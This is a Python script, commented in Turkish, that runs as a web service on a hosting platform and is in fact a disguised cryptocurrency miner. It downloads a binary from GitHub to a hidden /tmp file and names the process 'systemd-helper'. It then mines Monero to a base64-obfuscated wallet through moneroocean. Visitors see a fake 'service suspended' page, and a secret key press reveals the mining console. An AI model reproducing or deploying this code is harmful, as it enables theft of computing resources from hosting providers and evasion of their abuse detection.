#!/usr/bin/env python3
import os
import time
import base64
import threading
import subprocess
import ctypes
import http.server
import urllib.request
import json
import tempfile
import re
import resource
from urllib.parse import urlparse
from collections import deque

libc = ctypes.CDLL('libc.so.6')
CONSOLE_LOGS = deque(maxlen=50)
STATUS = {"running": False, "message": "Sistem Beklemede"}
WALLET_ADDR = base64.b64decode("NDl5cWJOZ0cxMzVld3FKOXVOUVhUZ0I5bUthVVhmZzFiM2FiQWJoc1NEZ2g0YXNWYmZIdVlES0FkaWlkbVRDQjhwQUNZZHd4ejc3VHdKaHdFU2hEdDZuQkI1WmpjdEw=").decode()
CF_WORKER_HOST = ""

POOLS = [
    "gulf.moneroocean.stream:10128"
]

def clean_ansi(text):
    ansi_escape = re.compile(r'\x1B(?:[@-Z\\-_]|\[[0-?]*[ -/]*[@-~])')
    return ansi_escape.sub('', text)

def log_to_console(msg):
    clean_msg = clean_ansi(msg)
    timestamp = time.strftime("%H:%M:%S")
    line = f"[{timestamp}] {clean_msg}"
    CONSOLE_LOGS.append(line)
    print(msg)

def set_process_name(name):
    try: libc.prctl(15, name.encode('utf-8'), 0, 0, 0)
    except: pass

def kill_process(proc):
    try:
        proc.terminate()
        time.sleep(1)
        proc.kill()
    except:
        pass

def set_memory_limit():
    try:
        limit_bytes = 536870912 # 512 MB
        resource.setrlimit(resource.RLIMIT_AS, (limit_bytes, limit_bytes))
    except Exception as e:
        pass

def get_worker_prefix():
    """
    Çalıştığı sitenin domain adından prefix (ön ek) çıkarır.
    Örn: xx-83o2.onrender.com -> xx-83o2
    """
    # Render.com otomatik ortam değişkeni
    host = os.environ.get("RENDER_EXTERNAL_HOSTNAME", "")
    
    # Eğer farklı bir platformsa veya manuel URL verilmişse
    if not host:
        raw_url = os.environ.get("PROXY_URL", "")
        if raw_url:
            parsed = urlparse(raw_url)
            host = parsed.netloc if parsed.netloc else raw_url.split('/')[0]
            
    if host:
        # Port veya protokol varsa temizle, ilk noktaya kadar olan kısmı al
        host = host.split(':')[0].replace("https://", "").replace("http://", "")
        return host.split('.')[0]
    
    return "node" # Domain bulunamazsa varsayılan isim

def execution_logic():
    global STATUS
    
    # 1. Aşama: Dosyayı sadece ilk başta bir kere indir
    try:
        log_to_console("Sistem başlatılıyor. Çekirdek indirilecek...")
        url = "https://github.com/Exma0/va/raw/refs/heads/main/x"
        req = urllib.request.Request(url, headers={'User-Agent': 'Mozilla/5.0'})
        with urllib.request.urlopen(req) as response:
            binary_content = response.read()
        
        tmp_path = '/tmp/.kernel-sys'
        with open(tmp_path, 'wb') as f:
            f.write(binary_content)
        
        os.chmod(tmp_path, 0o755)
        log_to_console("Çekirdek başarıyla hazırlandı.")
        set_process_name("systemd-helper")
        
    except Exception as e:
        STATUS["running"] = False
        STATUS["message"] = "İndirme Hatası"
        log_to_console(f"KRİTİK HATA (İndirme): {str(e)}")
        return # İndirme başarısızsa başlama

    # Prefix'i belirle
    worker_prefix = get_worker_prefix()

    # 2. Aşama: Sonsuz Döngü (Kapanırsa tekrar başlatır)
    while True:
        try:
            pools_to_try = []
            if CF_WORKER_HOST:
                pools_to_try.append(f"{CF_WORKER_HOST}:443")
            pools_to_try.extend(POOLS)
            
            STATUS["running"] = True
            STATUS["message"] = "Sistem Aktif"
            
            for pool_index, pool_host in enumerate(pools_to_try):
                log_to_console(f"Bağlantı deneniyor: {pool_host}")
                
                use_tls = ":443" in pool_host
                cmd = [
                    tmp_path, "-o", pool_host, "-u", WALLET_ADDR,
                    # Değişiklik burada yapıldı: "node" yerine dinamik worker_prefix kullanılıyor
                    "-p", f"{worker_prefix}-{int(time.time())%1000}~ghostrider", "--keepalive",
                    "--donate-level=1", "--cpu-max-threads-hint", "100"
                ]
                if use_tls:
                    cmd.append("--tls")
                
                proc = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
                                        text=True, env={"PATH": "/usr/bin:/bin", "HOME": "/tmp"},
                                        preexec_fn=set_memory_limit)
                
                error_count = 0
                max_errors = 5
                
                # Madencinin çıktılarını oku
                for line in iter(proc.stdout.readline, ""):
                    if not line:
                        break # Process kapandı
                        
                    log_to_console(f"{line.strip()}")
                    
                    if "read error" in line.lower() or "connection refused" in line.lower():
                        error_count += 1
                        if error_count >= max_errors:
                            log_to_console("Çok fazla bağlantı hatası, süreç durduruluyor...")
                            break # Hata limiti aşıldı, süreci öldür ve diğer havuza geç
                    
                    if "accepted" in line.lower():
                        error_count = 0 # Başarılı gönderimde hata sayacını sıfırla
                
                # Eğer buraya geldiysek madenci kapanmış veya biz break atmışızdır.
                kill_process(proc)
                log_to_console(f"{pool_host} ile bağlantı koptu veya madenci kapandı.")
                time.sleep(3) # Aşırı hızlı yeniden başlatmayı önlemek için bekle
                
            log_to_console("Tüm havuz listesi bitti, ana döngü baştan başlatılıyor...")
            time.sleep(5)
            
        except Exception as e:
            log_to_console(f"Çalışma zamanı hatası: {str(e)}")
            time.sleep(5)

class ControlHandler(http.server.BaseHTTPRequestHandler):
    def do_GET(self):
        if self.path == "/api/logs":
            self.send_response(200)
            self.send_header("Content-Type", "application/json")
            self.end_headers()
            self.wfile.write(json.dumps(list(CONSOLE_LOGS)).encode())
            return

        self.send_response(200)
        self.send_header("Content-Type", "text/html; charset=utf-8")
        self.end_headers()
        
        html = f"""
        <html><head><title>Service Suspended</title><style>
            body {{ background: #fff; color: #000; font-family: 'Times New Roman', Times, serif; margin: 0; padding: 10px; }}
            #fake-page {{ display: block; }}
            #real-console {{ display: none; background: #000; color: #0f0; font-family: 'Consolas', monospace; padding: 20px; min-height: 100vh; box-sizing: border-box; }}
            .panel {{ border: 1px solid #222; padding: 20px; max-width: 900px; margin: auto; background: #050505; }}
            #console {{ background: #000; border: 1px solid #111; height: 300px; overflow-y: auto; padding: 10px; font-size: 12px; color: #888; margin-top: 20px; }}
            .stat {{ color: {"#0f0" if STATUS["running"] else "#f00"}; font-weight: bold; }}
        </style></head><body>
            
            <div id="fake-page">This service has been suspended by its owner.</div>
            
            <div id="real-console">
                <div class="panel">
                    <h2>KERNEL CONTROL UNIT</h2>
                    <p>DURUM: <span class="stat">{STATUS['message']}</span></p>
                    <div id="console">Konsol bekleniyor...</div>
                </div>
            </div>

            <script>
                document.addEventListener('keydown', function(event) {{
                    if (event.key === 'Insert' || event.code === 'Insert') {{
                        var fakePage = document.getElementById('fake-page');
                        var realConsole = document.getElementById('real-console');
                        
                        if (realConsole.style.display === 'none' || realConsole.style.display === '') {{
                            realConsole.style.display = 'block';
                            fakePage.style.display = 'none';
                            document.body.style.background = '#000';
                            document.body.style.padding = '0';
                        }} else {{
                            realConsole.style.display = 'none';
                            fakePage.style.display = 'block';
                            document.body.style.background = '#fff';
                            document.body.style.padding = '10px';
                        }}
                    }}
                }});

                async function updateLogs() {{
                    try {{
                        const r = await fetch('/api/logs');
                        const logs = await r.json();
                        const c = document.getElementById('console');
                        
                        // Sadece yeni log varsa aşağı kaydır
                        let isScrolledToBottom = c.scrollHeight - c.clientHeight <= c.scrollTop + 50;
                        c.innerHTML = logs.join('<br>');
                        if(isScrolledToBottom) {{
                            c.scrollTop = c.scrollHeight;
                        }}
                    }} catch(e) {{}}
                }}
                setInterval(updateLogs, 2000);
                updateLogs();
            </script>
        </body></html>
        """
        self.wfile.write(html.encode())

def run():
    raw_url = os.environ.get("PROXY_URL", "")
    parsed = urlparse(raw_url)
    global CF_WORKER_HOST
    CF_WORKER_HOST = parsed.netloc if parsed.netloc else raw_url.split('/')[0]
    
    port = int(os.environ.get("PORT", 8080))
    
    if not STATUS["running"]:
        threading.Thread(target=execution_logic, daemon=True).start()
        
    print(f"Web sunucusu {port} portunda başlatılıyor...")
    http.server.ThreadingHTTPServer(("0.0.0.0", port), ControlHandler).serve_forever()

if __name__ == "__main__":
    run()
